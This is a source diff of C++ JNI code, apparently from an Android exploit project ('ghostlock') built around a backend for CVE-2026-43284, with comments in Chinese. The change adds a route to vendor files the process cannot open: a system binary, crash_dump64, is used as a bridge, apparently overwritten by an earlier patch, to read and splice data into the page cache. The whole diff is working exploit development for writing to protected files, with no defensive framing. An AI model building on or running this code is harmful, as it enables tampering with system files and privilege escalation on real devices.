@@ -450,6 +450,7 @@ namespace ghostlock::jni {
         std::unique_ptr<backend::cve_2026_43284::landing::PageCacheWrite> window;
         /* 载体打不开时走 helper 桥：桥、远程门、以及窗口用的 DoorOps 引用（2026-10-15：vendor 载体对本进程 EACCES）。 */
         std::unique_ptr<backend::cve_2026_43284::landing::CrashDumpBridge> bridge;
+        std::unique_ptr<backend::cve_2026_43284::landing::PageCacheDoorLinux> linux_door;
         std::unique_ptr<backend::cve_2026_43284::landing::RemoteDoor> remote;
         backend::cve_2026_43284::landing::DoorOps *doors_ops = nullptr;
         bool target_remote = false;
@@ -517,7 +518,7 @@ namespace ghostlock::jni {
          */
         const std::size_t target_slot = static_cast<std::size_t>(targetId >> 32U) - 1U;
         const std::size_t socket_slot = static_cast<std::size_t>(socketId) - 1U;
-        if (target_slot >= kMaxDoors || g_doors[target_slot].fd < 0) {
+        if (target_slot >= kMaxDoors || (g_doors[target_slot].fd < 0 && g_doors[target_slot].path.empty())) {
             return 0U;
         }
         if (socket_slot >= kMaxSockets || g_sockets[socket_slot] < 0) {
@@ -527,8 +528,32 @@ namespace ghostlock::jni {
             if (g_surfaces[index] == nullptr) {
                 auto surface = std::make_unique<Surface>();
                 surface->door = std::make_unique<PairedDoor>(g_doors[target_slot].fd, g_sockets[socket_slot]);
-                surface->io = std::make_unique<backend::cve_2026_43284::landing::RealSpliceIo>(
-                    backend::cve_2026_43284::landing::real_splice_io(), g_doors[target_slot].fd);
+                const bool remote = g_doors[target_slot].fd < 0;
+                if (remote) {
+                    /* 载体是本进程打不开的 vendor 文件：读与写都经 patch #1 写下的 helper（桥）。 */
+                    const std::string &carrier = g_doors[target_slot].path;
+                    const char *helper_path = "/apex/com.android.runtime/bin/crash_dump64";
+                    surface->linux_door = std::make_unique<backend::cve_2026_43284::landing::PageCacheDoorLinux>(
+                        carrier.c_str(), carrier.size());
+                    auto bridge = std::make_unique<backend::cve_2026_43284::landing::CrashDumpBridge>();
+                    if (!bridge->bind(helper_path, std::strlen(helper_path), carrier.c_str(), carrier.size())) {
+                        GL_LOGI("surface: bridge refused helper=%s carrier=%s", helper_path, carrier.c_str());
+                        return 0U;
+                    }
+                    surface->remote = std::make_unique<backend::cve_2026_43284::landing::RemoteDoor>(*surface->linux_door);
+                    surface->io = std::make_unique<backend::cve_2026_43284::landing::RealSpliceIo>(
+                        backend::cve_2026_43284::landing::real_splice_io(), -1, 0,
+                        bridge->old_page(), bridge->helper());
+                    surface->doors_ops = surface->remote.get();
+                    surface->target_remote = true;
+                    surface->bridge = std::move(bridge);
+                    GL_LOGI("surface: slot=%zu carrier is remote (%s) -> the bridge reads and splices it",
+                            index, carrier.c_str());
+                } else {
+                    surface->io = std::make_unique<backend::cve_2026_43284::landing::RealSpliceIo>(
+                        backend::cve_2026_43284::landing::real_splice_io(), g_doors[target_slot].fd);
+                    surface->doors_ops = surface->door.get();
+                }
                 g_surfaces[index] = std::move(surface);
                 return static_cast<std::uint64_t>(index) + 1U;
             }
@@ -564,7 +589,7 @@ namespace ghostlock::jni {
             return 0U;
         }
         auto window = std::make_unique<backend::cve_2026_43284::landing::PageCacheWrite>(
-            *g_surfaces[slot]->door, *g_surfaces[slot]->io);
+            *g_surfaces[slot]->doors_ops, *g_surfaces[slot]->io);
         GL_LOGI("surface: built slot=%zu (door fd + io wired)", slot);
         /* 窗口必须比落地对象活得久：把窗口也挂在 surface 上。 */
         g_surfaces[slot]->window = std::move(window);
